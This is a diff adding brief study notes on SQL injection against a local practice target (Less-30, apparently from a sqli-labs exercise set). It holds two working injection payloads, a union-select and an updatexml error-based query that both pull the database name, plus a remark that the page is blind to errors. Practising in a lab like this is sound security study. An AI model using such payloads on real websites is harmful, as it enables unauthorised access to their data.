@@ -1,0 +1,5 @@
+>>>http://127.0.0.1/sql/Less-30/?id=15%22%20union%20select%201,database(),1%20or%20%221%22=%221
+
+>>>127.0.0.1/sql/Less-30/?id=5" or updatexml(1,concat(0x7e,database(),0x7e),1) or "1"="1
+  |
+  ---> will not display any error as it is bliknd injection i.e., debug is set to false
